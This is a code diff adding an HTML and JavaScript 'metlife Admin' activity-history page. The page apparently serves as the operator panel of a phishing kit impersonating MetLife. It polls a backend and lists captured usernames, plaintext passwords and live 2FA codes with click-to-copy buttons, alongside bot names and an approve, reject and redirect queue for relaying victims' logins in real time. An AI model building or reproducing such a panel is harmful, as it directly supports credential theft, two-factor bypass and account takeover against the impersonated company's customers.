@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Activity History — metlife Admin</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="brand">
+            <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true">
+                <path d="M24 3 42 13v21L24 45 6 34V13L24 3Z" fill="none" stroke="#111" stroke-width="2.4"/>
+                <path d="M24 3v18l18-8M24 21 6 34M24 21l18 13" fill="none" stroke="#111" stroke-width="2"/>
+                <path d="m24 21 6 10-12 0 6-10Z" fill="none" stroke="#111" stroke-width="2"/>
+            </svg>
+            <div>
+                <div class="brand-name">metlife Admin </div>
+                <div class="tagline">Complete Activity Log</div>
+            </div>
+        </div>
+    </header>
+    <div class="layout">
+        <aside class="sidebar">
+            <div class="sidebar-title">QUEUE</div>
+            <nav class="nav">
+                <a href="pending-new.html" class=""><span>Pending</span><span class="count" id="pendingCount">0</span></a>
+                <a href="history-new.html" class="active"><span>History</span><span class="count" id="historyCount">0</span></a>
+                <a href="health.html" class=""><span>Health</span></a>
+            </nav>
+            <div class="sidebar-note">All login requests, 2FA verifications, and system events (max 100 per page).</div>
+        </aside>
+        <main class="main">
+            <h1 class="page-title">Activity History</h1>
+            <p class="page-subtitle">View all authentication activities including login requests, 2FA codes, denied requests, redirects, and expired requests.</p>
+           
+         
+
+            <div id="statusMessage"></div>
+            <div id="requestsContainer">
+                <div class="empty">Loading activity history...</div>
+            </div>
+
+            <!-- Pagination -->
+            <div id="paginationContainer" style="margin-top: 20px; display: flex; justify-content: center; gap: 10px; align-items: center;"></div>
+        </main>
+    </div>
+    <button class="queue-btn" onclick="location.href='history-new.html'"><span class="queue-icon"></span>Refresh</button>
+
+    <style>
+.activity-card {
+    width: 100%;
+    min-height: 120px;
+    padding: 16px 16px;
+    margin-bottom: 14px;
+    background: #ffffff;
+    border: 1px solid #d5d9df;
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08), 0 8px 20px rgba(0, 0, 0, 0.03);
+    position: relative;
+}
+
+.card-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 12px;
+    margin-bottom: 10px;
+}
+
+.site-name {
+    margin: 0;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    color: #465568;
+}
+
+.status {
+    margin: 0;
+    font-size: 13px;
+    font-weight: 500;
+    letter-spacing: 0.3px;
+}
+
+.status.redirected {
+    color: #08716f;
+}
+
+.status.approved {
+    color: #16802e;
+}
+
+.status.rejected {
+    color: #dc3545;
+}
+
+.details {
+    margin-top: 6px;
+}
+
+.details p {
+    margin: 6px 0;
+    font-size: 13px;
+    font-weight: 400;
+    color: #243447;
+    line-height: 1.4;
+}
+
+.details strong {
+    font-weight: 600;
+}
+
+.details code {
+    background: #f0f0f0;
+    padding: 2px 6px;
+    border-radius: 3px;
+    cursor: pointer;
+    user-select: all;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+}
+
+.details code:hover {
+    background: #e0e0e0;
+}
+
+.date {
+    margin-top: 6px;
+    font-size: 12px;
+    color: #718096;
+    letter-spacing: 0.2px;
+}
+
+@media (max-width: 600px) {
+    .activity-card {
+        padding: 13px 12px;
+        min-height: 110px;
+        margin-bottom: 10px;
+    }
+
+    .card-header {
+        gap: 10px;
+        margin-bottom: 8px;
+    }
+
+    .site-name {
+        font-size: 13px;
+    }
+
+    .status {
+        font-size: 12px;
+    }
+
+    .details {
+        margin-top: 5px;
+    }
+
+    .details p {
+        margin: 5px 0;
+        font-size: 12px;
+    }
+
+    .details code {
+        padding: 1px 5px;
+        font-size: 11px;
+    }
+
+    .date {
+        font-size: 11px;
+        margin-top: 5px;
+    }
+}
+    </style>
+
+    <script src="config.js"></script>
+    <script>
+        let allHistory = [];
+        let filteredHistory = [];
+        let currentPage = 1;
+        let totalPages = 1;
+        const itemsPerPage = 100;
+        let currentFilter = 'all';
+        let autoRefreshInterval = null;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.nav a').forEach(a => {
+                if (a.getAttribute('href') === 'history-new.html') {
+                    a.classList.add('active');
+                }
+            });
+
+            loadLoginHistory();
+            loadSidebarCounts();
+
+            autoRefreshInterval = setInterval(() => {
+                loadLoginHistory();
+                loadSidebarCounts();
+            }, 30000);
+        });
+
+        async function loadSidebarCounts() {
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/stats`);
+                const result = await response.json();
+
+                if (result.success && result.data) {
+                    const pendingCount = document.getElementById('pendingCount');
+                    const historyCount = document.getElementById('historyCount');
+
+                    if (pendingCount) {
+                        pendingCount.textContent = result.data.pending || 0;
+                    }
+                    if (historyCount) {
+                        historyCount.textContent = (result.data.approved || 0) + (result.data.rejected || 0) + (result.data.expired || 0) + (result.data.redirected || 0) || 0;
+                    }
+                }
+            } catch (err) {
+                console.error('Error loading sidebar counts:', err);
+            }
+        }
+
+        async function loadLoginHistory(page = 1) {
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/login-history?page=${page}&limit=100`);
+                const result = await response.json();
+
+                if (!result.success) {
+                    document.getElementById('requestsContainer').innerHTML = '<div class="empty">Error loading history</div>';
+                    return;
+                }
+
+                allHistory = result.data || [];
+                totalPages = result.pages || 1;
+                currentPage = page;
+
+                filterHistory(currentFilter);
+            } catch (err) {
+                console.error('Error loading login history:', err);
+                document.getElementById('requestsContainer').innerHTML = `<div class="empty">Error: ${err.message}</div>`;
+            }
+        }
+
+        function filterHistory(type) {
+            currentFilter = type;
+            currentPage = 1;
+
+            if (type === 'all') {
+                filteredHistory = allHistory;
+            } else {
+                filteredHistory = allHistory.filter(h => h.logType === type || h.displayStatus === type);
+            }
+
+            displayHistory(filteredHistory);
+        }
+
+        function displayHistory(data) {
+            const container = document.getElementById('requestsContainer');
+
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div class="empty">No activities found for selected filter</div>';
+                renderPagination();
+                return;
+            }
+
+            container.innerHTML = data.map(req => {
+                const activityType = getActivityType(req);
+                const statusClass = getStatusClass(req.status);
+                const statusBadge = getStatusBadge(req.status);
+                const activityIcon = getActivityIcon(req.logType || activityType);
+
+                let detailsHtml = '';
+                if (req.botname) detailsHtml += `<p><strong>Bot:</strong> ${req.botname}</p>`;
+                if (req.username) detailsHtml += `<p><strong>Username:</strong> <code onclick="copyToClipboard('${escapeHtml(req.username)}', this)" title="Click to copy">${escapeHtml(req.username)}</code></p>`;
+                if (req.password) detailsHtml += `<p><strong>Password:</strong> <code onclick="copyToClipboard('${escapeHtml(req.password)}', this)" title="Click to copy">${escapeHtml(req.password)}</code></p>`;
+                if (req.twoFAMethod) detailsHtml += `<p><strong>Method:</strong> <code onclick="copyToClipboard('${escapeHtml(req.twoFAMethod)}', this)" title="Click to copy">${escapeHtml(req.twoFAMethod)}</code></p>`;
+                if (req.twoFACode) detailsHtml += `<p><strong>2FA Code:</strong> <code onclick="copyToClipboard('${escapeHtml(req.twoFACode)}', this)" title="Click to copy">${escapeHtml(req.twoFACode)}</code></p>`;
+               const time = new Date(req.createdAt).toLocaleString();
+     
+
+                return `
+                    <section class="activity-card">
+                        <div class="card-header">
+                            <h2 class="site-name">${activityIcon} ${activityType.toUpperCase().replace(/_/g, ' ')}</h2>
+                            <span class="status ${statusClass}">${statusBadge}</span>
+                        </div>
+                        <div class="details">
+                            ${detailsHtml}
+                        </div>
+                        <div class="date">
+                            Requested: 
+                            ${time}
+                        </div>
+                    </section>
+                `;
+            }).join('');
+
+            renderPagination();
+        }
+
+        function getActivityType(req) {
+            if (req.logType) return req.logType;
+            if (req.status === 'redirected') return 'redirected_request';
+            if (req.status === 'expired') return 'expired_request';
+            if (req.status === 'rejected') return 'denied_request';
+            if (req.twoFACode) return '2fa_code';
+            return 'login_request';
+        }
+
+        function getStatusClass(status) {
+            const classMap = {
+                'approved': 'approved',
+                'rejected': 'rejected',
+                'expired': 'rejected',
+                'redirected': 'redirected',
+            };
+            return classMap[status] || 'pending';
+        }
+
+        function getStatusBadge(status) {
+            const badgeMap = {
+                'approved': '✅ Approved',
+                'rejected': '❌ Rejected',
+                'pending': '⏳ Pending',
+                'pending_approval': '⏳ Awaiting Approval',
+                'expired': '⏱️ Expired',
+                'redirected': '🔄 Redirected',
+            };
+            return badgeMap[status] || status;
+        }
+
+        function getActivityIcon(activityType) {
+            const iconMap = {
+                'login_request': '🔑',
+                '2fa_code': '🔐',
+                'denied_request': '❌',
+                'redirected_request': '🔄',
+                'expired_request': '⏱️',
+            };
+            return iconMap[activityType] || '📝';
+        }
+
+        function copyToClipboard(text, element) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = element.textContent;
+                element.textContent = '✓ Copied!';
+                element.style.background = '#d4edda';
+                setTimeout(() => {
+                    element.textContent = originalText;
+                    element.style.background = '#f0f0f0';
+                }, 2000);
+            }).catch(() => {
+                alert('Failed to copy');
+            });
+        }
+
+        function renderPagination() {
+            const container = document.getElementById('paginationContainer');
+
+            if (totalPages <= 1) {
+                container.innerHTML = '';
+                return;
+            }
+
+            let html = '';
+
+            if (currentPage > 1) {
+                html += `<button onclick="loadLoginHistory(${currentPage - 1})" style="padding: 8px 12px; cursor: pointer; border: 1px solid #ddd; border-radius: 4px; background: white;">← Previous</button>`;
+            }
+
+            for (let i = 1; i <= totalPages; i++) {
+                if (i === currentPage) {
+                    html += `<span style="padding: 8px 12px; font-weight: bold; color: #3498db;">${i}</span>`;
+                } else {
+                    html += `<button onclick="loadLoginHistory(${i})" style="padding: 8px 12px; cursor: pointer; border: 1px solid #ddd; border-radius: 4px; background: white;">${i}</button>`;
+                }
+            }
+
+            if (currentPage < totalPages) {
+                html += `<button onclick="loadLoginHistory(${currentPage + 1})" style="padding: 8px 12px; cursor: pointer; border: 1px solid #ddd; border-radius: 4px; background: white;">Next →</button>`;
+            }
+
+            container.innerHTML = html;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function formatTime(dateStr) {
+            const date = new Date(dateStr);
+            const now = new Date();
+            const diff = Math.floor((now - date) / 1000);
+
+            if (diff < 60) return 'Just now';
+            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        });
+    </script>
+</body>
+</html>
